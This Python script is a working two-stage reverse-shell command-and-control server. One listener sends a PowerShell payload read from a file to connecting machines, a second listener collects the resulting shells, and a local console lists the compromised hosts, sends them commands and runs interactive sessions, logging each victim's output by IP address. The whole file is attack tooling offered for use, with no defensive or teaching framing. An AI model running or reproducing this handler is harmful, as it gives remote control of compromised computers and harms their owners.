import socket
import threading
import argparse

# global data
shells = [] # [{addr,port,conn}]
def write_log(filename, entry):
    with open(filename, 'a') as file:
            file.write(entry)

# [stage1] handle incoming connections
# payload is a string appended to a command like 'powershell <payload>'
def handle_first_connections(ip='0.0.0.0', port='7774', payload=''):
    global shells
    # socket
    print(f'opening listener on {ip}:{port}... ', end='')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip, port))
    print('done. :)')
    # listen
    while True:
        s.listen(1)
        conn, addr = s.accept()
        log = f'[stage1 connection received {addr}]'
        print(f'\n{log}')
        write_log(f'stage1.txt', log+'\n')
        conn.sendall((payload + '\n').encode('utf-8'))

# [stage2] handle incoming connections
def handle_connections(ip='0.0.0.0', port='7775'):
    global shells
    # socket
    print(f'opening listener on {ip}:{port}... ', end='')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((ip, port))
    print('done. :)')
    # listen
    while True:
        s.listen(1)
        conn, addr = s.accept()
        log = f'[stage2 connection received {addr}]'
        print(f'\n{log}')
        write_log(f'{addr[0]}.txt', log+'\n')
        shells.append({'addr': addr[0], 'port': addr[1], 'conn': conn})

# cli funcs
def show_shells(conn): # print all items in the shells global var
    global shells
    for i in range(len(shells)):
        conn.sendall(f'[{i}] {shells[i]["addr"]}\n'.encode('utf-8'))

def send_command(conn): # send a command to a shell
    global shells
    conn.sendall(b'shell#> ')
    shell_index = conn.recv(1024).rstrip().decode('utf-8')
    if not shell_index.isnumeric():
        conn.sendall(b'input must be a shell index')
        return 1
    
    shell_index = int(shell_index)
    if  0 > shell_index > len(shells)-1:
        conn.sendall(b'invalid shell index')
        return -1
    shell = shells[shell_index]
    conn.sendall(b'cmd> ')
    cmd = conn.recv(1024).rstrip().decode('utf-8')
    cmd = cmd+'\n'
    shell['conn'].sendall(cmd.encode('utf-8'))
    resp = shell['conn'].recv(2048)
    write_log(f'{shell["addr"]}.txt', '> '+cmd)
    write_log(f'{shell["addr"]}.txt', resp.decode('utf-8'))
    conn.sendall(resp+b'\n')

def do_interactive(conn):
    global shells
    # prompt shell #
    conn.sendall(b'shell#> ')
    shell_index = conn.recv(1024).rstrip().decode('utf-8')
    # validate is numeric
    if not shell_index.isnumeric():
        conn.sendall(b'input must be a shell index')
        return 1
    shell_index = int(shell_index)
    # validate is valid
    if  0 > shell_index > len(shells)-1:
        conn.sendall(b'invalid shell index')
        return -1
    shell = shells[shell_index]

    # create interactive session
    while True:
        # prompt n$
        msg = f'{shell_index}$ '.encode('utf-8')
        conn.sendall(msg)
        cmd = conn.recv(1024).rstrip().decode('utf-8')
        # handle input
        if cmd == '.exit': return 0
        cmd = cmd+'\n'
        # interact with target
        shell['conn'].sendall(cmd.encode('utf-8'))
        resp = shell['conn'].recv(1024)
        conn.sendall(resp)
        write_log(f'{shell["addr"]}.txt', '> '+cmd)
        write_log(f'{shell["addr"]}.txt', resp.decode('utf-8'))

# args
parser = argparse.ArgumentParser()
parser.add_argument('-p', '--port', default=7774, type=int)
parser.add_argument('-f', '--file', type=str)
args = parser.parse_args()
port = args.port
payload_file = args.file
ip = '0.0.0.0'

# start stage1 listener
with open(payload_file) as f:
    payload = f.read()
t1 = threading.Thread(target=handle_first_connections, args=('0.0.0.0', 7774, payload), daemon=True).start()

# start stage2 listener
t2 = threading.Thread(target=handle_connections, args=('0.0.0.0', 7775), daemon=True).start()


""" cli """
def show_opts(conn):
    for opt in opts:
        cmd = opt.encode('utf-8') + b'\n'
        conn.sendall(cmd)

# cli
opts = {
    'shells': show_shells,
    'send': send_command,
    'interactive': do_interactive,
    'i': do_interactive,
    'help': show_opts,
    'end': 0
    #'.exit': exit
}

while True:
    print(f'opening listener on 127.0.0.1:7000... ', end='')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('127.0.0.1', 7000))
    print('done. :)')
    s.listen(1)
    conn, addr = s.accept()
    while True:
        conn.sendall(b'> ')
        cmd = conn.recv(1024)
        cmd = cmd.rstrip()
        cmd = cmd.decode('utf-8')
        if cmd == 'end':
            conn.close()
            break
        if cmd in opts: opts[cmd](conn)

